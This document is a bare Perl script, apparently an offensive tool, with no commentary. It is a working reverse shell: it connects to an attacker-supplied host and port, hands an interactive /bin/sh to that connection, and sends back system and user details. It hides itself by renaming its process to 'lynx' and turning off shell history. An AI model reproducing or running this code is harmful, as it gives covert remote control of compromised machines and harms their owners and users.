#!/usr/bin/perl
use Socket;
$cmd= "lynx";
$system= 'echo "`uname -a`";echo "`id`";HISTFILE=/dev/null /bin/sh -i';
$0=$cmd;
$target=$ARGV[0];
$port=$ARGV[1];
$iaddr=inet_aton($target) || die("Error: $!\n");
$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system($system);
close(STDIN);
close(STDOUT);
close(STDERR);

